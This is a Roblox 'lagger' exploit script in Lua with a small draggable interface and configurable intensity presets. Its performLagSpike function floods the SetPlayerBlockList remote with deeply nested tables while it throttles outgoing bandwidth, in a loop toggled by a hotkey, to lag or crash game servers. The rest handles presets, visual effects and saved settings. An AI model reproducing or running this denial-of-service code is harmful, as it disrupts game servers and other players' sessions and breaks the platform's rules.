local function saveConfiguration()
    pcall(function()
        writefile(configFileName, HttpService:JSONEncode({
            Preset = currentPreset,
            Key = triggerKey.Name,
        }))
    end)
end

local function loadConfiguration()
    local success, exists = pcall(function() return isfile and isfile(configFileName) end)
    if not (success and exists) then return end
    local success2, fileContent = pcall(function() return readfile(configFileName) end)
    if not (success2 and fileContent and fileContent ~= "") then return end
    local success3, data = pcall(function() return HttpService:JSONDecode(fileContent) end)
    if not (success3 and data) then return end
    if data.Preset and presetSettings[data.Preset] then currentPreset = data.Preset end
    if data.Key then triggerKey = Enum.KeyCode[data.Key] or Enum.KeyCode.T end
end

local function performLagSpike(amount)
    local masterTable = {}
    local spamTable = {{}}
    local currentReference = spamTable[1]
    for _ = 1, amount do 
        local newTable = {}
        table.insert(currentReference, newTable)
        currentReference = newTable
    end
    local maxIterations = math.min(499999 / (amount + 2), 1500)
    for _ = 1, maxIterations do 
        table.insert(masterTable, spamTable) 
    end
    pcall(function()
        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(masterTable)
    end)
end

local function startLagger()
    if lagThread then return end
    isLaggerActive = true
    lagThread = task.spawn(function()
        while isLaggerActive do
            local settings = presetSettings[currentPreset]
            pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(settings.kbps) end)
            performLagSpike(settings.power)
            task.wait(settings.wait)
        end
    end)
end

local function stopLagger()
    isLaggerActive = false
    if lagThread then pcall(function() task.cancel(lagThread) end); lagThread = nil end
end

local function toggleLagger()
    if isLaggerActive then stopLagger() else startLagger() end
    if refreshToggleVisual then refreshToggleVisual() end
end

local function stopUltraPulse()
    if ultraPulseThread then
        pcall(function() task.cancel(ultraPulseThread) end)
        ultraPulseThread = nil
    end
end

local function startUltraPulse()
    stopUltraPulse()
    ultraPulseThread = task.spawn(function()
        local t = 0
        while mainStroke and mainStroke.Parent do
            t = t + 0.06
            local r = math.clamp(160 + math.floor(math.sin(t) * 60), 0, 255)
            local g = math.clamp(20 + math.floor(math.sin(t * 0.6) * 20), 0, 255)
            local b = math.clamp(240 + math.floor(math.sin(t * 1.4) * 15), 0, 255)
            mainStroke.Color = Color3.fromRGB(r, g, b)
            statusDot.BackgroundColor3 = Color3.fromRGB(r, g, b)
            mainStroke.Thickness = 2 + math.abs(math.sin(t * 1.2)) * 1.5
            task.wait(0.05)
        end
    end)
end

refreshPresetUI = function()
    local activeColor = presetColors[currentPreset]
    if currentPreset ~= "ULTRA" then
        stopUltraPulse()
        mainStroke.Thickness = 2
    end
    for name, btn in pairs(presetButtons) do
        local isActive = (name == currentPreset)
        local color = presetColors[name]
        local r = math.floor(color.R * 255)
        local g = math.floor(color.G * 255)
        local b = math.floor(color.B * 255)
        TweenService:Create(btn, TweenInfo.new(0.15), {
            BackgroundColor3 = isActive and Color3.fromRGB(math.floor(r * 0.12), math.floor(g * 0.12), math.floor(b * 0.12)) or Color3.fromRGB(26, 26, 32),
        }):Play()
        btn.TextColor3 = isActive and color or colorDim
        local stroke = btn:FindFirstChildOfClass("UIStroke")
        if stroke then
            stroke.Color = isActive and color or colorBorder
            stroke.Transparency = isActive and 0.1 or 0.5
            stroke.Thickness = isActive and 1.5 or 1
        end
    end
    if currentPreset == "ULTRA" then
        startUltraPulse()
    else
        TweenService:Create(mainStroke, TweenInfo.new(0.2), { Color = activeColor }):Play()
        TweenService:Create(statusDot, TweenInfo.new(0.2), { BackgroundColor3 = activeColor }):Play()
    end
end

local isDragging = false
local dragStartInput, dragStartPosition
headerFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStartInput = input.Position
        dragStartPosition = mainFrame.Position
        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then isDragging = false end end)
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragStartInput then
        local delta = input.Position - dragStartInput
        mainFrame.Position = UDim2.new(dragStartPosition.X.Scale, dragStartPosition.X.Offset + delta.X, dragStartPosition.Y.Scale, dragStartPosition.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then isDragging = false end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if isListeningForKey then
        if input.KeyCode and input.KeyCode ~= Enum.KeyCode.Unknown then
            triggerKey = input.KeyCode
            keyButton.Text = "KEY: " .. triggerKey.Name
            keyButton.TextColor3 = colorDim
            isListeningForKey = false
            saveConfiguration()
        end
        return
    end
    if input.KeyCode == triggerKey then toggleLagger() end
    if input.KeyCode == Enum.KeyCode.LeftControl then mainFrame.Visible = not mainFrame.Visible end
end)
